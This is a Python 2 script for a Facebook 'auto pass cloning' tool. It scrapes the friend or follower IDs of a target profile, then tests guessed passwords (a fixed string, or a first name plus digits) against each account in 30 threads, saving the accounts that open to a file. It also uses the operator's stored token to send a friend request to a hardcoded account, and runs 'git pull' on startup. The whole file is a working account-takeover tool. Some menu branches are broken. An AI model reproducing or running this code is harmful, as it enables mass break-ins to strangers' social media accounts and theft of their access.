#!/usr/bin/python
# coding=utf-8
import os, sys
CorrectUsername = 'dump10'
CorrectPassword = 'dump20'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            loop = 'false'
        else:
            print 'Wrong Password'
            os.system('xdg-open https://www.facebook.com/groups/163289698887595/?ref=share')
    else:
        print 'Wrong Username'
        os.system('xdg-open https://chat.whatsapp.com/GdZ7LmokWjUGCZstKumq6k')

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 paid20.py')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass 
try:
    os.mkdir("/sdcard/ids/ex_ids")
except OSError:
    pass
os.system("git pull")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

    
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'
os.system('git pull')
os.system('clear')
logo = """
 \033[1;95m   THIS COMMAND ONLY FOR DUMP FILE.
 \033[1;92m   DUMP 100067 , 100068 , 100069 IDS ONLY.

\033[1;97m-----------------------------------------------
"""

idh = []
back = 0

def login_choice():
	os.system("clear")
	try:
		open(".login.txt","r")
		menu()
	except IOError:
		os.system("clear")
		print(logo)
		print 47 * "\033[1;93m═"
		print("\t    \033[1;32mLOGIN MENU\033[0;97m")
		print 47 * "\033[1;96m═"
		print("\033[1;97m(\033[1;92m1\033[1;97m) Login with token")
		print("\033[1;97m(\033[1;92m2\033[1;97m) Login with id/pass")
		print("")
		login_select()
def login_select():
	select = raw_input("\033[1;92m>>> \033[0;97m")
	if select =="1":
		login_token()
	elif select =="2":
		login_fb()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		time.sleep(1)
		login_select()
def login_fb():
	os.system("clear")
	print(logo)
	print 47 * "\033[1;91m═"
	print("\t    \033[1;32mLOGIN WITH ID/PASS\033[0;97m")
	print 47 * "\033[1;91m═"
	id = raw_input(" Id/mail/number: ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password: ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".login.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		menu()
	elif "www.facebook.com" in q["error"]:
		print("")
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		time.sleep(1)
		print("")
		raw_input("\tPress enter to back ")
		login_choice()
	else:
		print("")
		print("\t    \033[1;31mIncorrect credentials\033[0;97m")
		raw_input("Press enter to try again ")
		login_choice()
def login_token():
	os.system("clear")
	try:
		open(".login.txt","r")
		time.sleep(1)
		menu()
	except (KeyError , IOError):
	    os.system("clear")
	    print(logo)
	    print 47 * "\033[1;91m═"
	    print("\t    \033[1;32mFB TOKEN LOGIN\033[0;97m")
	    print 47 * "\033[1;91m═"
	    token = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste token : ")
	    token_save = open(".login.txt","w")
	    token_save.write(token)
	    token_save.close()
	    time.sleep(1)
	    menu()
def menu():
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		os.system("clear")
		print("")
		print(logo)
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	try:
		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
		a = json.loads(r.text)
		name = a["name"]
	except KeyError:
		os.system("clear")
		print("")
		print(logo)
		print("")
		print("\t    \033[1;31mToken expired\033[0;97m")
		time.sleep(1)
		os.system("rm -rf .login.txt")
		login_choice()
	os.system("clear")
	print(logo)
	print 47 * "\033[1;93m═"
	print("\t    \033[1;32mUser: "+name+"\033[0;97m")
	print 47 * "\033[1;91m═"
	
	print("\033[1;96m(\033[1;91m1\033[1;96m) Extract/Dump ids")
	print("")
	menu_option()
def menu_option():
	select = raw_input("\033[1;92m>>> \033[0;97m")
	if select =="":
		crack()
	elif select =="":
		choice()
	elif select =="1":
		ex_id()
	elif select =="":
	    ex_file()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	
	print("\t    \033[1;33mAUTO PASS CLONING\033[0;97m")
	print
	print("\033[1;92m(\033[1;96m1\033[1;92m) Crack Public Friendlist")
	print("\033[1;95m(\033[1;91m2\033[1;95m) Crack File Account")
	print("\033[1;96m(\033[1;92m0\033[1;96m) Back")
	
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33m>>> \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
		print("")
		idt = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) User id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;97m(\033[1;93m✓\033[1;97m) User Name : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"'/subscribers?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS FILE CRACK\033[0;97m")
		print("")
		try:
			filelist = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste Dump File Path : >> ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			crack()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		crack_select()
	print("\033[1;97m(\033[1;93m✓\033[1;97m) Total Account : "+str(len(id)))
	print 47 * '═'
	
    
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = "pakistanqwer"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m(MAFIA-KILLER-OK) "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/MAFIA-KILLER-OK.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\x1b[0;36m(MAFIA-KILLER-CP) "+uid+" | "+pass1)
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total MAFIA-KILLER Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	crack()
def ex_id():
    idg=[]
    global token
    try:
    	token = open(".login.txt","r").read()
    except IOError:
    	print("\t    \033[1;31mToken not found\033[0;97m")
    	print("")
    	time.sleep(1)
    	login_choice()
    os.system("clear")
    
    print 47 * "\033[1;97m═"
    print("\t  \033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
    print 47 * "\033[1;97m═"
    idh = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Input Id: ")
    try:
        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
        q = json.loads(r.text)
        print("\033[1;97m(\033[1;91m✓\033[1;97m) Collecting from: "+q["name"])
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
        raw_input(" Press enter to back")
        crack()
    r = requests.get("https://graph.facebook.com/"+idh+"'/subscribers?access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open("friends.txt","w")
    for i in q["data"]:
        uid = i["id"]
        na = i["name"]
        nm=na.rsplit(" ")[0]
        idg.append(uid+"|"+nm)
        ids.write(uid+"|"+nm + "\n")
    ids.close()
    print("")
    print(47*"-")
    print("")
    print(" The process has completed")
    print(" Total ids: "+str(len(idg)))
    print("")
    print(47*"-")
    print("")
    raw_input(" Press enter to download file")
    
    
    os.system("rm -rf friends.txt")
    print(" File downloaded successfully")
    time.sleep(1)
    print ("\033[1;93mSaved /sdcard/friends.txt") 
    print ("\033[1;93mEnter Go Back")
    menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	
	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
	
	print("\033[1;97m(\033[1;92m1\033[1;97m) Crack Public Friendlist")
	print("\033[1;97m(\033[1;92m2\033[1;97m) Crack File Account")
	print("\033[1;97m(\033[1;91m0\033[1;91m) Back")
	print("")
	choice_select()
def choice_select():
	select = raw_input("\033[1;32m>>> \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mCHOICE NAME PASS CRACK\033[0;97m")
		
		p1 = raw_input("\033[1;97m(\033[1;91m1\033[1;91m) Name + Digit : ")
		
		print 
		print("\t    \033[1;32mCHOICE DIGIT PASS CRACK\033[0;97m")
		print 47 * "\033[1;91m═"
		
		print 
		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;95m")
		print("")
		idt = raw_input("\033[1;97m(\033[1;91m+\033[1;92m) User id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;92m(\033[1;93m✓\033[1;95m) User id : "+q["name"])
		except KeyError:
			print("\t    \033[1;33mLogged in id has checkpoint\033[0;96m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	
	elif select =="2":
		os.system("clear")
		print(logo)
		print
		print("\t    \033[1;32mCHOICE NAME PASS CRACK\033[0;97m")
		
		p1 = raw_input("\033[1;97m(\033[1;91m1\033[1;91m) Name + Digit : ")
		
		print 
		print("\t    \033[1;32mCHOICE DIGIT PASS CRACK\033[0;97m")
		print 47 * "\033[1;91m═"
		
		pass7 = raw_input("\033[1;97m(\033[1;91m7\033[1;97m) Digit Password : ")
		
		print("")
		print("\t    \033[1;32mAUTO PASS FILE CRACK\033[0;97m")
		print("")
		try:
			filelist = raw_input("\033[1;92m(\033[1;93m+\033[1;95m) Paste File path :>> ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;36mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			menu()
	
	
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select() 
	print("\033[1;97m(\033[1;93m✓\033[1;97m) Total Account : "+str(len(id)))
	print 47 * '═'
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+ p1
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m(MAFIA-KILLER-OK) "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/MAFIA-KILLER-OK.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			
																
																
			
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total MAFIA-KILLER Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	choice()
if __name__ == '__main__':
	login_choice()

